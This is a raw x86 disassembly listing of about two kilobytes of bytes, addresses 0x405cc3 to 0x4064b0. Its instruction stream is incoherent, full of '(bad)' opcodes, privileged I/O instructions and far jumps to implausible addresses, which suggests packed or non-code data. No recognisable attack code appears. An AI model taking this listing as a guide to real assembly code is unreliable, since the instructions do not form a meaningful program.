  405cc3:	and    ch,cl
  405cc5:	loope  0x405ce3
  405cc7:	mov    cl,0xb2
  405cc9:	sahf   
  405cca:	mov    DWORD PTR [edi+ebx*1+0x73],esp
  405cce:	(bad)  
  405ccf:	or     BYTE PTR [ecx],bh
  405cd1:	mov    DWORD PTR ds:0x61b5c0db,0xd3e4041e
  405cdb:	mov    al,ds:0xa43e056c
  405ce0:	xlat   BYTE PTR ds:[ebx]
  405ce1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ce2:	fisub  WORD PTR [eax+0x68]
  405ce5:	loopne 0x405d2e
  405ce7:	or     edx,DWORD PTR [edx+eax*8+0x5dc8174e]
  405cee:	sub    dh,BYTE PTR ds:0xb95db701
  405cf4:	xor    DWORD PTR [ebp+0x3810f97f],0x541260b6
  405cfe:	stos   BYTE PTR es:[edi],al
  405cff:	sbb    eax,0xf2f16b76
  405d04:	mov    ebp,0xbba210af
  405d09:	repz mov eax,ds:0xb25ceb07
  405d0f:	sub    ebx,DWORD PTR [ebx-0x39]
  405d12:	stc    
  405d13:	aaa    
  405d14:	sbb    DWORD PTR [ecx-0x7c371945],ecx
  405d1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d1b:	cs cmp al,0x59
  405d1e:	jmp    0xba2fe75e
  405d23:	add    eax,0x81c137bd
  405d28:	ret    0xf906
  405d2b:	xor    edi,DWORD PTR [eax+eiz*8+0x6d]
  405d2f:	mov    edx,0x1c4f5b71
  405d34:	cmp    dh,BYTE PTR [eax-0xf]
  405d37:	in     eax,0x34
  405d39:	or     dh,al
  405d3b:	inc    eax
  405d3c:	fistp  WORD PTR [eax-0x6]
  405d3f:	cwde   
  405d40:	xchg   ebx,eax
  405d41:	pop    eax
  405d42:	mov    ch,BYTE PTR [ecx]
  405d44:	inc    esp
  405d45:	fwait
  405d46:	in     eax,0x5d
  405d48:	out    0x91,al
  405d4a:	das    
  405d4b:	clc    
  405d4c:	and    DWORD PTR [edx],esi
  405d4e:	mov    bl,0xa
  405d50:	test   eax,0x8e7f65e3
  405d55:	ins    DWORD PTR es:[edi],dx
  405d56:	and    BYTE PTR [ebp+0x537d92ff],cl
  405d5c:	call   FWORD PTR [edx]
  405d5e:	repz dec esi
  405d60:	ror    BYTE PTR [ecx-0x7a],1
  405d63:	lds    ebp,FWORD PTR [edi*1+0xfbc3c8c]
  405d6a:	jo     0x405dbe
  405d6c:	out    0x9d,al
  405d6e:	gs mov ch,0x7c
  405d71:	adc    ah,bl
  405d73:	clts   
  405d75:	add    al,BYTE PTR ds:0x187e893a
  405d7b:	jnp    0x405d35
  405d7d:	lahf   
  405d7e:	jecxz  0x405d41
  405d80:	test   DWORD PTR [eax-0x85d157c],esi
  405d86:	xchg   BYTE PTR [edx-0xb24767c],bh
  405d8c:	outs   dx,DWORD PTR ds:[esi]
  405d8d:	addr16 pusha 
  405d8f:	cmp    DWORD PTR [ebx+0x6cbbff91],edi
  405d95:	jne    0x405e0b
  405d97:	xor    ah,bl
  405d99:	push   esp
  405d9a:	(bad)  
  405d9b:	sti    
  405d9c:	test   DWORD PTR [edi-0x30f0d786],ebx
  405da2:	stos   DWORD PTR es:[edi],eax
  405da3:	pop    eax
  405da4:	inc    ecx
  405da5:	sahf   
  405da6:	imul   ecx,ebp,0xffffffbe
  405da9:	nop
  405daa:	stc    
  405dab:	lahf   
  405dac:	(bad)  
  405dad:	jmp    0x405e19
  405daf:	out    0x5,eax
  405db1:	mov    dh,0x31
  405db3:	jl     0x405e25
  405db5:	and    DWORD PTR [eax+0x9283acc],esi
  405dbb:	push   edx
  405dbc:	mov    ecx,0xda3e697f
  405dc1:	sub    dh,0x91
  405dc4:	stos   DWORD PTR es:[edi],eax
  405dc5:	jb     0x405d89
  405dc7:	xor    DWORD PTR [edi-0x1b839ffe],ebp
  405dcd:	imul   esp,ebx,0xffffffc5
  405dd0:	pop    ss
  405dd1:	mov    eax,0x830e52e5
  405dd6:	ins    BYTE PTR es:[edi],dx
  405dd7:	and    esi,0xc
  405dda:	mov    ch,0x9a
  405ddc:	mov    BYTE PTR [ebx+0x6d],0x5d
  405de0:	mov    dh,0x15
  405de2:	push   es
  405de3:	sbb    DWORD PTR [esi-0x71],esi
  405de6:	mov    al,ds:0x219307a9
  405deb:	out    0x5e,al
  405ded:	inc    esp
  405dee:	pop    ebx
  405def:	mov    ds:0x591bc507,eax
  405df4:	int3   
  405df5:	xchg   ecx,eax
  405df6:	sbb    edx,esp
  405df8:	out    0xd6,al
  405dfa:	gs loope 0x405da8
  405dfd:	imul   esi,DWORD PTR [ebp-0x38130682],0x6ac8d9f7
  405e07:	jmp    0xcf5e1ae6
  405e0c:	stos   BYTE PTR es:[edi],al
  405e0d:	cmc    
  405e0e:	fstp   DWORD PTR [ecx-0x319f3b02]
  405e14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405e15:	sbb    eax,0x66567b63
  405e1a:	pushf  
  405e1b:	mov    ds:0xa3b1f870,al
  405e20:	addr16 das 
  405e22:	lahf   
  405e23:	mov    cl,0xd0
  405e25:	adc    edx,DWORD PTR [ebx-0x5d8b2e37]
  405e2b:	xchg   DWORD PTR [ebx],esi
  405e2d:	imul   esi,DWORD PTR [edi+0x51],0x35
  405e31:	jmp    0x405e83
  405e33:	sbb    eax,0x3ffdd486
  405e38:	aam    0x62
  405e3a:	sub    esp,0x8b8b40d2
  405e40:	sti    
  405e41:	cdq    
  405e42:	addr16 mov ah,0x58
  405e46:	inc    eax
  405e47:	loopne 0x405e44
  405e49:	mov    ds:0xbad692e8,eax
  405e4e:	test   BYTE PTR [ebp+0x31d1df2b],0x62
  405e55:	sub    eax,0x2a9cb035
  405e5a:	ss dec ebx
  405e5c:	es ret 
  405e5e:	pop    esi
  405e5f:	pop    ss
  405e60:	popf   
  405e61:	imul   edi,DWORD PTR [ecx-0x12],0xffffffa8
  405e65:	push   ds
  405e66:	sub    DWORD PTR ds:0xb1472f75,esp
  405e6c:	imul   ecx,DWORD PTR [esi],0x7ca8c86c
  405e72:	call   0xda1a:0x4a96b33
  405e79:	je     0x405ec2
  405e7b:	cmp    esi,DWORD PTR [ebx+0x3c]
  405e7e:	xchg   DWORD PTR [edx-0x6815be14],esp
  405e84:	inc    edx
  405e85:	rol    BYTE PTR [ebx],0x8c
  405e88:	test   al,0x4c
  405e8a:	es inc esi
  405e8c:	cmp    cl,cl
  405e8e:	mov    DWORD PTR [ecx],esp
  405e90:	mov    al,0xe8
  405e92:	mov    esi,0x9f66bc6d
  405e97:	mov    DWORD PTR [eax],ebp
  405e99:	xchg   ecx,eax
  405e9a:	sahf   
  405e9b:	ret    0xf005
  405e9e:	xchg   edx,eax
  405e9f:	shl    DWORD PTR [ecx],cl
  405ea1:	or     eax,0xd1f36c98
  405ea6:	add    esp,DWORD PTR [eax-0x1e583298]
  405eac:	sbb    al,BYTE PTR [edx-0x5d9717d9]
  405eb2:	mov    ds:0xb5b32510,eax
  405eb7:	iret   
  405eb8:	pop    es
  405eb9:	xchg   ebp,eax
  405eba:	cmp    al,0x3
  405ebc:	cwde   
  405ebd:	int3   
  405ebe:	push   cs
  405ebf:	mov    al,ds:0x6631d063
  405ec4:	retf   
  405ec5:	add    DWORD PTR [ebx+esi*4],ecx
  405ec8:	pop    ebp
  405ec9:	sti    
  405eca:	iret   
  405ecb:	dec    edx
  405ecc:	mov    dh,0xd5
  405ece:	popf   
  405ecf:	fiadd  WORD PTR [ebx+0x7b108859]
  405ed5:	or     al,0x7a
  405ed7:	outs   dx,DWORD PTR ds:[esi]
  405ed8:	in     eax,dx
  405ed9:	xor    BYTE PTR [ecx],bl
  405edb:	jae    0x405f53
  405edd:	pop    ss
  405ede:	mov    eax,ds:0xed344516
  405ee3:	xor    ch,BYTE PTR [eax+0x5e59a598]
  405ee9:	mov    ecx,0x8a4b643
  405eee:	(bad)  
  405eef:	dec    ebx
  405ef0:	stos   BYTE PTR es:[edi],al
  405ef1:	fcmovnbe st,st(1)
  405ef3:	xchg   edi,eax
  405ef4:	mov    eax,ds:0x9dc27467
  405ef9:	and    BYTE PTR [edi],ah
  405efb:	add    al,0x1d
  405efd:	jp     0x405f78
  405eff:	std    
  405f00:	aad    0xf8
  405f02:	fsubr  DWORD PTR [eax]
  405f04:	inc    ebp
  405f05:	jle    0x405ef8
  405f07:	mov    dl,0x6f
  405f09:	and    ah,bl
  405f0b:	xchg   esi,eax
  405f0c:	retf   0xe3bb
  405f0f:	fwait
  405f10:	or     cl,BYTE PTR [edi]
  405f12:	and    al,0x50
  405f14:	or     edx,DWORD PTR [ebx+0x5b6ca9bf]
  405f1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f1b:	dec    eax
  405f1c:	ds jnp 0x405f31
  405f1f:	neg    dl
  405f21:	arpl   sp,ax
  405f23:	add    eax,0x9c4d94bc
  405f28:	push   eax
  405f29:	pop    eax
  405f2a:	jbe    0x405ed1
  405f2c:	and    esp,DWORD PTR [edx]
  405f2e:	shl    DWORD PTR [esi+0x93ffe3],cl
  405f34:	cmp    esi,DWORD PTR [edi+0x6df77d5a]
  405f3a:	cmp    ch,BYTE PTR [ecx-0x25beaa72]
  405f40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f41:	and    al,0x67
  405f43:	je     0x405fa7
  405f45:	xchg   esp,eax
  405f46:	mov    esp,DWORD PTR [ebx-0x3]
  405f49:	out    dx,al
  405f4a:	repz mov ch,0xa
  405f4d:	in     al,dx
  405f4e:	mov    eax,ds:0x22dba3ad
  405f53:	mov    esp,DWORD PTR [ebx+esi*2-0x5883ed67]
  405f5a:	or     BYTE PTR [edi+esi*2-0x2a],ch
  405f5e:	sbb    BYTE PTR [edi+0x4c8d5897],cl
  405f64:	adc    edx,DWORD PTR [ecx+0x51df13b3]
  405f6a:	or     DWORD PTR [ebp-0x1bf95b26],0x3b671ede
  405f74:	les    esp,FWORD PTR [edx-0x27]
  405f77:	cdq    
  405f78:	and    ah,BYTE PTR [eax-0x57d26dd4]
  405f7e:	mov    WORD PTR [edi],es
  405f80:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  405f82:	sar    ecx,0x56
  405f85:	and    esp,DWORD PTR [eax]
  405f87:	mov    WORD PTR [ecx+0x318edaea],gs
  405f8d:	pushf  
  405f8e:	mov    edx,0xf04fa4f5
  405f93:	dec    esp
  405f94:	fwait
  405f95:	jmp    0xb77981e4
  405f9a:	sbb    al,0x53
  405f9c:	pop    edi
  405f9d:	inc    esi
  405f9e:	mov    edx,0x2fddd15e
  405fa3:	fnstsw WORD PTR [edi]
  405fa5:	mov    dh,BYTE PTR [ecx+0xb82cbcf]
  405fab:	push   0x27
  405fad:	(bad)  
  405fae:	retf   
  405faf:	fcom   st(7)
  405fb1:	lahf   
  405fb2:	cdq    
  405fb3:	mov    dl,0x59
  405fb5:	push   esp
  405fb6:	mov    ch,0x5e
  405fb8:	test   DWORD PTR [edx+0x12672632],esi
  405fbe:	xor    DWORD PTR [esi],ecx
  405fc0:	out    dx,eax
  405fc1:	imul   BYTE PTR [edi+0x7d]
  405fc4:	jp     0x405f89
  405fc6:	ins    BYTE PTR es:[edi],dx
  405fc7:	idiv   esi
  405fc9:	lods   al,BYTE PTR ds:[esi]
  405fca:	pop    es
  405fcb:	lods   eax,DWORD PTR ds:[esi]
  405fcc:	jmp    0x1060:0xf8762ace
  405fd3:	adc    bh,BYTE PTR [ecx+ebx*8+0x2e]
  405fd7:	(bad)  
  405fd8:	jl     0x405f9c
  405fda:	mov    dh,0xcd
  405fdc:	es mov edx,0x3c759dfa
  405fe2:	imul   edx,DWORD PTR [eax],0xcbb6a1ca
  405fe8:	psllq  mm2,QWORD PTR [ebx+0x8]
  405fec:	pusha  
  405fed:	and    BYTE PTR [edx+0xdcf2fc9],cl
  405ff3:	jne    0x40604c
  405ff5:	xchg   esi,eax
  405ff6:	aas    
  405ff7:	addr16 xchg edx,eax
  405ff9:	fsubrp st(0),st
  405ffb:	mov    eax,ds:0xab2a959a
  406000:	mov    al,ds:0x973c7089
  406005:	dec    edx
  406006:	(bad)
  406009:	xor    ch,ah
  40600b:	call   0xf29:0x2f9d64dd
  406012:	js     0x406058
  406014:	aaa    
  406015:	jge    0x40601b
  406017:	xchg   ebx,eax
  406018:	aas    
  406019:	push   ds
  40601a:	mov    ecx,0xd616b836
  40601f:	es dec esp
  406021:	jmp    0xc6ed2232
  406026:	(bad)  
  406028:	cmp    DWORD PTR [eax+0x6d],ebp
  40602b:	jmp    0x406017
  40602d:	int    0x2
  40602f:	(bad)  
  406031:	sbb    DWORD PTR [ebx],edi
  406033:	xchg   ebp,eax
  406034:	popf   
  406035:	add    DWORD PTR [ecx-0x25db9807],0x7e5c7a75
  40603f:	inc    edx
  406040:	add    bh,BYTE PTR [eax]
  406042:	mov    dh,0xe7
  406044:	sbb    al,0xb6
  406046:	jecxz  0x40606e
  406048:	add    cl,al
  40604a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40604b:	popf   
  40604c:	jb     0x405fe9
  40604e:	sbb    edx,ecx
  406050:	cmp    eax,0x5eb203bb
  406055:	add    bl,BYTE PTR [ebx]
  406057:	adc    edi,DWORD PTR [esi-0x2c]
  40605a:	and    edi,esi
  40605c:	nop
  40605d:	mov    eax,0xcd47a99a
  406062:	das    
  406063:	pusha  
  406064:	push   ss
  406065:	retf   0x8c6
  406068:	sbb    ebp,ebp
  40606a:	lods   eax,DWORD PTR ds:[si]
  40606c:	sub    bl,ah
  40606e:	cmp    esp,DWORD PTR [ebx]
  406070:	or     BYTE PTR [ebx-0x59588fc5],0xb7
  406077:	aas    
  406078:	xchg   edi,eax
  406079:	cmc    
  40607a:	jle    0x4060b6
  40607c:	push   eax
  40607d:	mov    edx,0xa04b4062
  406082:	xor    bh,BYTE PTR [ebx+0x2c729755]
  406088:	xchg   ebx,eax
  406089:	sub    DWORD PTR [edi-0x5e],eax
  40608c:	sbb    BYTE PTR [eax],0xec
  40608f:	xchg   ecx,eax
  406090:	jg     0x40606a
  406092:	imul   ecx,DWORD PTR [ebp-0x2e9a6da7],0xdf6f0f45
  40609c:	jp     0x4060c4
  40609e:	xchg   ebx,eax
  40609f:	mov    ebp,DWORD PTR [edx+ecx*8+0xb65b104]
  4060a6:	cmp    ebp,DWORD PTR [ecx+ebp*8-0x5a]
  4060aa:	retf   0xa1a0
  4060ad:	ret    0xd741
  4060b0:	or     BYTE PTR [edx],dl
  4060b2:	mov    ecx,0x16719937
  4060b7:	fimul  DWORD PTR [ebx]
  4060b9:	data16 (bad) 
  4060bb:	xrelease mov DWORD PTR [eax+0x71],edx
  4060bf:	into   
  4060c0:	sub    DWORD PTR [edi+0x65633a39],esi
  4060c6:	ins    BYTE PTR es:[edi],dx
  4060c7:	int    0x6f
  4060c9:	mov    ebp,0x774840bf
  4060ce:	imul   ecx,edi,0x49
  4060d1:	das    
  4060d2:	inc    ecx
  4060d3:	scas   al,BYTE PTR es:[edi]
  4060d4:	push   ebx
  4060d5:	sti    
  4060d6:	sar    DWORD PTR [eax+eiz*8+0x4c9aa56e],0xfd
  4060de:	fld    st(2)
  4060e0:	ins    DWORD PTR es:[edi],dx
  4060e1:	not    ebp
  4060e3:	call   FWORD PTR [ecx+0x3c]
  4060e6:	icebp  
  4060e7:	pop    ds
  4060e8:	fisttp QWORD PTR [ecx]
  4060ea:	mov    ebx,0x695f1306
  4060ef:	adc    al,al
  4060f1:	or     BYTE PTR [ecx-0x1e2e10a4],cl
  4060f7:	aad    0xcb
  4060f9:	jge    0x40610c
  4060fb:	inc    eax
  4060fc:	in     al,0xea
  4060fe:	inc    eax
  4060ff:	imul   edx,DWORD PTR [ecx],0xa6f8e1da
  406105:	loope  0x4060f1
  406107:	punpckhwd mm6,mm5
  40610a:	sub    esp,ebx
  40610c:	dec    ebp
  40610d:	es jne 0x4060ec
  406110:	addr16 push esi
  406112:	lahf   
  406113:	push   cs
  406114:	jbe    0x406107
  406116:	push   ss
  406117:	push   ecx
  406118:	mov    al,0xf8
  40611a:	mov    esi,0x830cc8f1
  40611f:	mov    edx,0xa8e188f0
  406124:	jno    0x4060fb
  406126:	cmp    al,0xcf
  406128:	loopne 0x4060fa
  40612a:	fcomp  DWORD PTR [ebx-0x22]
  40612d:	cmp    esp,DWORD PTR [ebp-0x2ef9425]
  406133:	gs inc edi
  406135:	out    dx,eax
  406136:	mov    edx,0xae4cc191
  40613b:	inc    DWORD PTR [ecx+ecx*8]
  40613e:	(bad)  
  40613f:	shl    DWORD PTR [esi+0xb4949d4],0x69
  406146:	adc    edi,DWORD PTR [eax-0xc]
  406149:	cmp    eax,0xb98712e
  40614e:	scas   eax,DWORD PTR es:[edi]
  40614f:	mov    cl,0xb7
  406151:	das    
  406152:	add    cl,BYTE PTR [ebx-0x39]
  406155:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406156:	shl    DWORD PTR ds:0xc25bff6d,0xac
  40615d:	jp     0x4061b6
  40615f:	mov    edi,0xd04ec0be
  406164:	jmp    0x40615c
  406166:	jecxz  0x40615c
  406168:	add    BYTE PTR [edx],dl
  40616a:	xor    edi,DWORD PTR es:[eax+0x58]
  40616e:	loope  0x40616c
  406170:	fiadd  DWORD PTR [ecx+0x35caa3db]
  406176:	loope  0x40610d
  406178:	pop    ss
  406179:	pop    ebp
  40617a:	adc    eax,DWORD PTR [esi+0x3f1bd75c]
  406180:	loopne 0x406131
  406182:	push   ebp
  406183:	push   0xffffffe2
  406185:	cmp    DWORD PTR [edx+0x4f5a4ef5],ebp
  40618b:	fs retf 0x7325
  40618f:	jb     0x406140
  406191:	mov    ah,0xc
  406193:	or     ebx,DWORD PTR [edx]
  406195:	mov    ah,0x46
  406197:	add    ebp,DWORD PTR [eax]
  406199:	dec    edx
  40619a:	inc    ebp
  40619b:	jo     0x4061cb
  40619d:	jmp    0xb1a6:0x98ad2a2
  4061a4:	retf   0xb6b1
  4061a7:	imul   esp,DWORD PTR [eax],0x2f
  4061aa:	xor    ch,ah
  4061ac:	xchg   esi,eax
  4061ad:	pusha  
  4061ae:	imul   eax,DWORD PTR [esi],0x44
  4061b1:	or     bl,BYTE PTR [edi+edx*1]
  4061b4:	fnsave [edx+0x18]
  4061b7:	pop    ss
  4061b8:	mov    cs,WORD PTR [eax-0x5a]
  4061bb:	inc    esi
  4061bc:	xchg   esi,eax
  4061bd:	loopne 0x406215
  4061bf:	push   0x90f36308
  4061c4:	adc    eax,ebp
  4061c6:	jl     0x4061d4
  4061c8:	pop    ebp
  4061c9:	xchg   BYTE PTR [edi+0x32b80513],cl
  4061cf:	loope  0x40615b
  4061d1:	in     eax,dx
  4061d2:	push   ebp
  4061d3:	jne    0x40622e
  4061d5:	inc    ebx
  4061d6:	add    eax,0xd93f1331
  4061db:	sub    ecx,DWORD PTR [bx+0x66e9]
  4061e0:	mov    BYTE PTR [ebx+0x66],bh
  4061e3:	lds    eax,FWORD PTR [ebx-0x6749de17]
  4061e9:	xchg   DWORD PTR [edx],edx
  4061eb:	pop    eax
  4061ec:	ret    0xf1e2
  4061ef:	inc    esp
  4061f0:	mov    ah,0x35
  4061f2:	test   al,0x15
  4061f4:	shl    BYTE PTR [esi+0x26],cl
  4061f7:	inc    BYTE PTR ds:0xe678f6b1
  4061fd:	push   ebx
  4061fe:	or     BYTE PTR [eax],dh
  406200:	pop    esi
  406201:	ins    DWORD PTR es:[edi],dx
  406202:	fadd   st(1),st
  406204:	fdiv   QWORD PTR [ebx-0x4497f2b7]
  40620a:	mov    ch,0xe1
  40620d:	push   ecx
  40620e:	out    0xec,eax
  406210:	aam    0xda
  406212:	adc    edx,ecx
  406214:	pop    ebp
  406215:	adc    bh,bh
  406217:	iret   
  406218:	ret    
  406219:	jne    0x406239
  40621b:	test   esp,0xdba0a038
  406221:	cmp    ebp,DWORD PTR [edx+0x4b3c6b15]
  406227:	xor    esi,DWORD PTR [esi+edi*4+0x5122cd1d]
  40622e:	(bad)  
  40622f:	(bad)  
  406230:	(bad)  
  406232:	div    DWORD PTR [esi]
  406234:	daa    
  406235:	loopne 0x4061c9
  406237:	adc    al,ch
  406239:	fwait
  40623a:	mov    ecx,0xd67b88a3
  40623f:	adc    edx,DWORD PTR [ecx-0xe]
  406242:	out    dx,al
  406243:	stc    
  406244:	lods   al,BYTE PTR ds:[esi]
  406245:	in     al,dx
  406246:	test   al,0x3
  406248:	lds    ebp,FWORD PTR [ecx]
  40624a:	and    dl,dh
  40624c:	ret    0x80dc
  40624f:	and    BYTE PTR [ecx+0x4b6b89b],cl
  406255:	push   0xffffffa1
  406257:	or     al,0x23
  406259:	inc    esp
  40625a:	in     eax,dx
  40625b:	fdivr  QWORD PTR [edi-0x37]
  40625e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40625f:	jnp    0x4061fa
  406261:	test   BYTE PTR [esi],dh
  406263:	push   esi
  406264:	scas   eax,DWORD PTR es:[edi]
  406265:	test   eax,0x553a9802
  40626a:	pop    edi
  40626b:	loope  0x406208
  40626d:	shr    BYTE PTR [esi],0x9b
  406270:	scas   eax,DWORD PTR es:[edi]
  406271:	jno    0x40620f
  406273:	fidiv  WORD PTR [edx]
  406275:	stos   DWORD PTR es:[edi],eax
  406276:	or     eax,0x9a971ff2
  40627b:	xchg   DWORD PTR [ebp-0x4706b20],ebx
  406281:	xchg   ecx,eax
  406282:	ja     0x4062c5
  406284:	cmp    esp,DWORD PTR [edi-0x7]
  406287:	rdpmc  
  406289:	xor    dl,ch
  40628b:	jae    0x4062e9
  40628d:	jbe    0x406260
  40628f:	sub    eax,0x4147e41b
  406294:	adc    BYTE PTR [ecx+0x739c1da8],ah
  40629a:	daa    
  40629b:	jo     0x406226
  40629d:	mov    ah,0x9
  40629f:	(bad)  
  4062a0:	out    dx,eax
  4062a1:	loope  0x4062b6
  4062a3:	xor    bh,ah
  4062a5:	or     BYTE PTR [ebp+0x36],ah
  4062a8:	test   ebp,0x8397ebbf
  4062ae:	popf   
  4062af:	fcmovu st,st(2)
  4062b1:	imul   esi,ebp,0xffffffbb
  4062b4:	sub    dl,BYTE PTR [ebx+eiz*4-0x2f]
  4062b8:	int    0x61
  4062ba:	pusha  
  4062bb:	cmp    eax,0xaaf7fe3
  4062c0:	pop    ecx
  4062c1:	push   ebp
  4062c2:	ds jmpw 0xf7d9
  4062c7:	adc    al,0x5c
  4062c9:	clc    
  4062ca:	sbb    ecx,eax
  4062cc:	pop    ss
  4062cd:	int3   
  4062ce:	icebp  
  4062cf:	xchg   edi,eax
  4062d0:	mov    ah,0x4e
  4062d2:	(bad)  
  4062d3:	pop    esp
  4062d4:	(bad)  
  4062d5:	cld    
  4062d6:	ret    
  4062d7:	dec    esp
  4062d8:	push   edx
  4062d9:	dec    ebx
  4062da:	mov    BYTE PTR [ecx+0x284567de],dl
  4062e0:	icebp  
  4062e1:	cmp    ch,BYTE PTR [edx+0x56]
  4062e4:	inc    ebp
  4062e5:	test   eax,0xa99c5986
  4062ea:	test   DWORD PTR [ecx-0x77],ebx
  4062ed:	in     al,dx
  4062ee:	mov    ds:0x5829b621,al
  4062f3:	mov    eax,0xeb0b97d3
  4062f8:	dec    ebx
  4062f9:	cld    
  4062fa:	daa    
  4062fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062fc:	push   cs
  4062fd:	push   ss
  4062fe:	sub    ecx,DWORD PTR [ecx]
  406300:	mov    bl,0xfd
  406302:	dec    ebp
  406303:	or     ah,BYTE PTR [edi]
  406305:	push   esi
  406306:	outs   dx,DWORD PTR ds:[esi]
  406307:	int3   
  406308:	jae    0x4062fe
  40630a:	sbb    al,0xf1
  40630c:	mov    fs,WORD PTR [eax]
  40630e:	push   esp
  40630f:	aas    
  406310:	mov    WORD PTR [esi+0x4f],gs
  406313:	push   ebx
  406314:	xchg   esi,eax
  406315:	push   ecx
  406316:	in     al,0x3d
  406318:	ret    
  406319:	xlat   BYTE PTR ds:[ebx]
  40631a:	push   eax
  40631b:	(bad)  
  40631d:	jl     0x40634c
  40631f:	mov    esi,0x2f11d358
  406324:	imul   eax,DWORD PTR [edx-0x5339063c],0x66
  40632b:	cli    
  40632c:	cmp    al,0xf0
  40632e:	xor    ebx,esp
  406330:	pushf  
  406331:	stc    
  406332:	and    DWORD PTR [edx-0x42],0xceeb0888
  406339:	div    DWORD PTR [ebp-0x21]
  40633c:	arpl   WORD PTR [eax],bx
  40633e:	adc    edi,DWORD PTR [ecx]
  406340:	dec    esp
  406341:	enter  0xed4d,0x51
  406345:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406346:	sbb    al,0xc0
  406348:	xor    al,0x50
  40634a:	sub    al,BYTE PTR [esi-0x5d3a5751]
  406350:	icebp  
  406351:	add    DWORD PTR [edi-0x69],0xf4f0deed
  406358:	jbe    0x4063c8
  40635a:	imul   edx,DWORD PTR [eax],0x63bebda3
  406360:	mov    dl,0x77
  406362:	mov    ?,WORD PTR [esi]
  406364:	jno    0x4063db
  406366:	je     0x406369
  406368:	mov    ah,0x56
  40636a:	adc    al,0xf0
  40636c:	aam    0xd0
  40636e:	xchg   esi,eax
  40636f:	push   esp
  406370:	repnz das 
  406372:	imul   DWORD PTR [ebx+edi*4-0x7c]
  406376:	test   eax,0x2b9e3dbb
  40637b:	adc    al,0xaf
  40637d:	fstp   QWORD PTR [edx+0x7dc953c8]
  406383:	or     BYTE PTR [esi+0x26],ah
  406386:	pop    eax
  406387:	add    eax,DWORD PTR [ebx]
  406389:	stos   DWORD PTR es:[edi],eax
  40638a:	jp     0x4063ea
  40638c:	mov    edx,0xb1b08e7d
  406391:	ret    0x5b25
  406394:	loopne 0x4063c6
  406396:	cs push eax
  406398:	xchg   esi,eax
  406399:	pushf  
  40639a:	cmp    al,ah
  40639c:	in     eax,0x9a
  40639e:	iret   
  40639f:	mov    eax,ds:0x431e9a14
  4063a4:	not    esi
  4063a6:	popf   
  4063a7:	jmp    0xaea6:0xaeb50cf2
  4063ae:	call   0x9224:0x63afa4dd
  4063b5:	inc    ecx
  4063b6:	(bad)  
  4063b7:	data16 adc al,0x34
  4063ba:	xchg   edi,eax
  4063bb:	and    dh,dl
  4063bd:	repnz repnz retf 
  4063c0:	dec    esi
  4063c1:	xor    eax,0x145651e3
  4063c6:	rcl    BYTE PTR [edi],cl
  4063c8:	inc    esp
  4063c9:	mov    cl,0xa1
  4063cb:	es je  0x40642d
  4063ce:	repz cdq 
  4063d0:	mov    ch,0x46
  4063d2:	and    eax,0xee0d395d
  4063d7:	jmp    0xc5325a5c
  4063dc:	in     al,0xf1
  4063de:	add    ebx,DWORD PTR [edi]
  4063e0:	arpl   WORD PTR ds:0xa26cb6cd,dx
  4063e6:	je     0x4063ca
  4063e8:	fcomp  DWORD PTR [eax+ebp*4-0x6e]
  4063ec:	pop    ebp
  4063ed:	pop    ds
  4063ee:	cmp    BYTE PTR [ebx-0x20],0xb8
  4063f2:	sar    DWORD PTR [ecx+0x2],0x74
  4063f6:	push   ds
  4063f7:	inc    edx
  4063f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063f9:	inc    ecx
  4063fa:	(bad)
  4063fe:	mov    esp,0x219763c0
  406403:	push   0x40093435
  406408:	scas   eax,DWORD PTR es:[edi]
  406409:	ret    0x2f03
  40640c:	in     al,0x96
  40640e:	ret    
  40640f:	pusha  
  406410:	add    ah,BYTE PTR [esi]
  406412:	mov    al,0xb
  406414:	in     al,0x8e
  406416:	lods   al,BYTE PTR ds:[esi]
  406417:	shl    ecx,1
  406419:	push   ebp
  40641a:	dec    esi
  40641b:	dec    esp
  40641c:	dec    ebp
  40641d:	add    eax,0x677deae7
  406422:	add    DWORD PTR [eax+0x3b],ebp
  406425:	gs push esp
  406427:	and    al,0x49
  406429:	sbb    ecx,edx
  40642b:	sub    esi,DWORD PTR [ecx+0x23e2d6c7]
  406431:	in     eax,dx
  406432:	sbb    al,0xc1
  406434:	es (bad) 
  406436:	mov    WORD PTR [ecx+edx*2+0x6ff92885],?
  40643d:	sub    al,0xbd
  40643f:	test   al,0x54
  406441:	push   ss
  406442:	mov    ebx,0x7d360a20
  406447:	jne    0x406405
  406449:	ret    
  40644a:	xchg   edx,eax
  40644b:	retf   
  40644c:	shl    DWORD PTR [ebp+0x79],1
  40644f:	fucomip st,st(1)
  406451:	add    al,0xaf
  406453:	lahf   
  406454:	and    al,0x14
  406456:	cmp    esi,DWORD PTR [eax]
  406458:	pop    DWORD PTR [esi-0x7ceb2f58]
  40645e:	outs   dx,DWORD PTR ds:[esi]
  40645f:	repnz inc ecx
  406461:	push   cs
  406462:	xor    BYTE PTR [esi+0x19],ch
  406465:	xchg   DWORD PTR ds:0xbccb6e88,edx
  40646b:	addr16 jns 0x406479
  40646e:	jl     0x40647f
  406470:	scas   al,BYTE PTR es:[edi]
  406471:	dec    ecx
  406472:	sbb    eax,0x32706b06
  406477:	gs das 
  406479:	jl     0x4064a6
  40647b:	clc    
  40647c:	xor    DWORD PTR [ebx+0x494d05ea],esp
  406482:	jno    0x4064e5
  406484:	mov    eax,0x3c9d65e2
  406489:	in     eax,0x3e
  40648b:	leave  
  40648c:	enter  0x2984,0x73
  406490:	inc    edx
  406491:	retf   0x3b2b
  406494:	popf   
  406495:	mov    edi,0x45edf253
  40649a:	xchg   BYTE PTR [edx],dl
  40649c:	repnz and eax,0x68fd718c
  4064a2:	mov    esp,0x183e5bc7
  4064a7:	nop
  4064a8:	xchg   edx,eax
  4064a9:	(bad)  
  4064ab:	sahf   
  4064ac:	ret    
  4064ad:	pop    esi
  4064ae:	dec    ebx
  4064af:	push   ds
  4064b0:	out    dx,eax
